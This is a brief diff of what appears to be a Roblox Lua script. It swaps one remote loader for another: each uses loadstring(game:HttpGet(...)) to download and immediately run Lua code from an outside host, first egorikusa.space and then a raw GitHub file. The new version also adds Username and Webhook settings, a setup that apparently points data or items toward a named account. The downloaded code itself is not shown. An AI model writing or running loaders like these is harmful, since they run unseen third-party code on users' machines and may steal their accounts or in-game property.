@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/69315b429a46e7ca31f58d37.lua", true))()
+Username = "loadstping"
+Webhook = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Fedzen/Script.bf2/refs/heads/main/.lua", true))()
